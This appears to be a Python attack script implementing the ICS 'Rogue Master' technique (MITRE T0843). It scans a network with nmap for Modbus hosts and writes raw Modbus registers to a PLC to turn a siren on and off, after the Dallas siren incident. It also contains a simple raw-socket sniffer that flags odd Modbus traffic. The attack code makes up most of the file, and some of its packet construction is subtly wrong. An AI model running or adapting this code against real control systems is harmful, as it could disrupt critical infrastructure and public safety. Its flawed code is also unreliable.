import socket
import struct
import time
import subprocess
import re

# MITRE ATT&CK Technique: Initial Access - Rogue Master (T0843)

# --- Configuration ---
TARGET_PLC_VENDOR = "Rockwell Automation"  # Example, adjust as needed
TARGET_PLC_MODEL = "Micro850"          # Example, adjust as needed
MASTER_IP_RANGE = "192.168.1.0/24"     #Adjust to match your control network.
MASTER_IP = None                        #Leave to None if Auto IP Discovery is needed
#Adjust if auto IP discovery is disabled
ROGUE_MASTER_PORT = 502                 # Default Modbus port, adjust if different
NETWORK_INTERFACE = "eth0" # Network interface to bind to (e.g., eth0, wlan0).  Adjust accordingly
DETECTION_THRESHOLD = 5                 # Number of malformed/unexpected packets before action.

# --- Modbus Constants (adjust as needed for your specific application) ---
MODBUS_READ_HOLDING_REGISTERS = 0x03
MODBUS_WRITE_SINGLE_REGISTER = 0x06

# ---  Dallas Siren Incident Example Data (Adjust to match your PLC's functionality) ---
#  This is just an example.  You MUST replace this with values relevant to your target system.
#  These registers are totally fictional and for demonstration only.
SIREN_CONTROL_REGISTER = 40001   # Register to control siren activation
SIREN_STATUS_REGISTER = 40002    # Register to read siren status
SIREN_ACTIVATE_VALUE = 0xFFFF    # Value to activate the siren
SIREN_DEACTIVATE_VALUE = 0x0000  # Value to deactivate the siren

# ---  Global Variables ---
packet_counter = 0
unexpected_packet_counter = 0


# --- Helper Functions ---

def find_plc_ip_address(vendor, model, ip_range):
    """
    Scans the network to identify the PLC IP Address.
    This is a very basic discovery and should be refined.
    For production use, consider using a more robust discovery mechanism
    or hardcoding the IP address.

    Args:
        vendor (str): The expected vendor name of the PLC.
        model (str): The expected model name of the PLC.
        ip_range (str): The IP range to scan.

    Returns:
        str: The IP address of the PLC if found, None otherwise.
    """

    print("[+] Attempting to discover PLC IP address...")
    try:
        # Use nmap to scan the network for devices
        nmap_process = subprocess.Popen(['nmap', '-sn', ip_range], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = nmap_process.communicate()
        output = stdout.decode('utf-8')

        # Parse the nmap output to find potential PLC IP addresses
        for line in output.splitlines():
            if "Nmap scan report" in line and "for" in line:
                ip_address = line.split("for")[1].strip()
                if "(" not in ip_address:
                    print(f"Checking: {ip_address}")
                    try:
                        # Check if we can connect to the PLC to confirm.
                        #This is a simplified verification
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)  # Short timeout
                        sock.connect((ip_address, ROGUE_MASTER_PORT)) #Check default Modbus port
                        sock.close()
                        print(f"  [+] Possible PLC found at {ip_address}")
                        return ip_address  # Return first potential match - refine for multiple PLCs
                    except (socket.timeout, ConnectionRefusedError, OSError):
                        print(f"  [-] Connection refused or timeout to {ip_address}.  Not a likely candidate.")
                        pass

    except FileNotFoundError:
        print("[-] nmap not found. Please install nmap or provide PLC IP address manually.")
        return None

    print("[-] PLC IP address not found. Ensure the PLC is online and nmap is installed.")
    return None

def craft_modbus_packet(transaction_id, unit_id, function_code, data):
    """
    Crafts a Modbus TCP/IP packet.

    Args:
        transaction_id (int): The Modbus transaction identifier.
        unit_id (int): The Modbus unit identifier.
        function_code (int): The Modbus function code.
        data (bytes): The data payload.

    Returns:
        bytes: The crafted Modbus packet.
    """
    protocol_id = 0  # Modbus TCP/IP
    length = len(data) + 2  # Length of the remaining packet (unit ID + data)
    header = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    return header + data


def send_rogue_command(target_ip, port, register, value):
    """
    Sends a rogue Modbus command to the PLC.

    Args:
        target_ip (str): The IP address of the PLC.
        port (int): The port number of the PLC.
        register (int): The Modbus register to write to.
        value (int): The value to write to the register.
    """
    global packet_counter
    packet_counter += 1
    transaction_id = packet_counter & 0xFFFF  # Keep transaction ID within valid range

    # Craft Modbus packet to write a single register
    data = struct.pack(">HH", register, value)  # Register address, Value
    packet = craft_modbus_packet(transaction_id, 1, MODBUS_WRITE_SINGLE_REGISTER, data)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.sendall(packet)
        response = sock.recv(1024) # Adjust buffer size as needed

        #Very basic validation - check transaction id matches
        received_transaction_id = struct.unpack(">H", response[:2])[0]
        if received_transaction_id == transaction_id:
            print(f"[+] Rogue command sent successfully to {target_ip}:{port}. Transaction ID:{transaction_id}  Wrote register {register} with value {value}")
        else:
            print(f"[-] Warning: Transaction ID mismatch. Sent: {transaction_id}, Received: {received_transaction_id}")

        sock.close()

    except Exception as e:
        print(f"[-] Error sending rogue command: {e}")

def sniff_packets(target_ip, port, interface):
    """
    Sniffs network packets and detects unexpected Modbus traffic.

    Args:
        target_ip (str): The IP address of the PLC.
        port (int): The port number of the PLC.
        interface (str): The network interface to sniff packets on.
    """
    global unexpected_packet_counter
    try:
        # Create a raw socket to sniff packets
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        s.bind((interface, 0))

        print(f"[+] Sniffing packets on interface {interface}...")

        while True:
            raw_data, addr = s.recvfrom(65535)
            # Extract IP Header
            ip_header = struct.unpack("!BBHHHBBH4s4s", raw_data[14:34])
            version = ip_header[0] >> 4
            ihl = ip_header[0] & 0xF
            ip_header_length = ihl * 4
            src_address = socket.inet_ntoa(ip_header[8])
            dest_address = socket.inet_ntoa(ip_header[9])

            # Check if the packet is TCP and to the target IP and port
            if version == 4 and src_address == target_ip and dest_address == get_local_ip(interface):
                tcp_header = struct.unpack("!HHLLBBHHH", raw_data[14 + ip_header_length:14 + ip_header_length + 20]) #Fixed TCP Header Length of 20 bytes
                source_port = tcp_header[0]
                destination_port = tcp_header[1]

                if destination_port == port:

                    # Attempt to parse Modbus header to check the protocol_id (should be zero)
                    try:
                        modbus_header = struct.unpack(">HHHB", raw_data[14 + ip_header_length + 20:14 + ip_header_length + 20 + 8]) #Modbus TCP Header is 8 bytes.
                        transaction_id = modbus_header[0]
                        protocol_id = modbus_header[1] #Should be 0 for Modbus/TCP
                        length = modbus_header[2]
                        unit_id = modbus_header[3]

                        # Basic check for unexpected Protocol ID.
                        if protocol_id != 0:
                            unexpected_packet_counter += 1
                            print(f"[-] Unexpected Modbus Packet Received! Protocol ID: {protocol_id}, Transaction ID: {transaction_id}")
                            if unexpected_packet_counter > DETECTION_THRESHOLD:
                                print("[-] Detection threshold exceeded! Possible attack detected.")
                                # Add your response here - log the event, trigger an alert, etc.
                                # For example:
                                # log_attack_event(f"Possible rogue master detected: Unexpected Modbus packet from {src_address}")
                    except struct.error as e:
                        print(f"[-] Could not parse packet. Not a Modbus TCP packet or corrupted: {e}")
    except Exception as e:
        print(f"[-] Error sniffing packets: {e}")
        s.close()

def get_local_ip(interface):
    """
    Gets the IP address of a given network interface.

    Args:
        interface (str): The name of the network interface.

    Returns:
        str: The IP address of the interface.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))  # Connect to a public DNS server (doesn't actually send data)
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"[-] Error getting local IP address: {e}")
        return None

def main():
    global MASTER_IP
    """
    Main function to execute the Rogue Master attack.
    """
    print("[+] Starting Rogue Master simulation...")

    if not MASTER_IP:
        MASTER_IP = find_plc_ip_address(TARGET_PLC_VENDOR, TARGET_PLC_MODEL, MASTER_IP_RANGE)
        if not MASTER_IP:
            print("[-] Could not automatically determine PLC IP address. Please provide it manually.")
            return

    print(f"[+] Targeting PLC at IP: {MASTER_IP}")

    # Start the packet sniffer in a separate thread
    import threading
    sniffer_thread = threading.Thread(target=sniff_packets, args=(MASTER_IP, ROGUE_MASTER_PORT, NETWORK_INTERFACE))
    sniffer_thread.daemon = True  # Allow the main thread to exit even if the sniffer thread is running
    sniffer_thread.start()

    # Give the sniffer thread time to start
    time.sleep(1)

    # Simulate sending rogue commands.  Replace with actual attack logic.
    print("[+] Sending rogue commands...")

    # Example: Activate the sirens (replace with your actual control logic)
    send_rogue_command(MASTER_IP, ROGUE_MASTER_PORT, SIREN_CONTROL_REGISTER, SIREN_ACTIVATE_VALUE)
    time.sleep(2)

    # Example: Deactivate the sirens
    send_rogue_command(MASTER_IP, ROGUE_MASTER_PORT, SIREN_CONTROL_REGISTER, SIREN_DEACTIVATE_VALUE)

    print("[+] Rogue Master simulation complete.")


if __name__ == "__main__":
    main()